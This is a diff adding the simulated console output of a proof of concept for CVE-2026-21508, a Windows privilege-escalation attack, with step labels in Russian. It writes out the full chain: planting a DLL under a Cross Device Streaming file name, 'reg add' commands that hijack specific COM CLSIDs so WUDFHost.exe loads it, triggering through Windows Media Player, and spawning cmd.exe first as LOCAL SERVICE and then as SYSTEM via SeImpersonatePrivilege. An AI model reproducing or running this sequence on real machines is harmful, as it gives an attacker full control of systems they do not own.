@@ -1,0 +1,46 @@
+=====================================
+CVE-2026-21508 PoC
+=====================================
+[!] РЕЖИМ: ИМИТАЦИЯ
+
+[1] USB подготовка
+    copy alps.jpg F:\
+    [OK]
+
+[2] DLL развертывание
+    mkdir C:\ProgramData\CrossDevice
+    copy Session0_CMD.dll C:\ProgramData\CrossDevice\CrossDevice.Streaming.Source.dll
+    [OK]
+
+[3] Реестр
+    reg add HKCU\Software\Classes\CLSID\{F5FB2C77-0E2F-4A16-A381-3E560C68BC83}\Instance /V CLSID /D {E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496} /f
+    reg add HKCU\Software\Classes\CLSID\{E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496}\ShellFolder /f
+    [OK]
+
+[4] Триггер
+    timeout 2
+    start C:\Program Files (x86)\Windows Media Player\wmplayer.exe
+    [OK]
+
+[5] WUDFHost.exe
+    PID: 1234 | LOCAL SERVICE
+    _SHCoCreateInstance({F5FB2C77-0E2F-4A16-A381-3E560C68BC83})
+    → Чтение CLSID: {E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496}
+    → Загрузка: C:\ProgramData\CrossDevice\CrossDevice.Streaming.Source.dll
+    [OK]
+
+[6] DllMain
+    RevertToSelf()
+    CreateProcess(cmd.exe)
+    PID: 5678 | PPID: 1234 | LOCAL SERVICE
+    [OK]
+
+[7] SYSTEM эскалация
+    SeImpersonatePrivilege
+    CreateProcessAsUser(cmd.exe)
+    PID: 7890 | SYSTEM
+    [OK]
+
+=====================================
+[+] Атака эмулирована
+=====================================
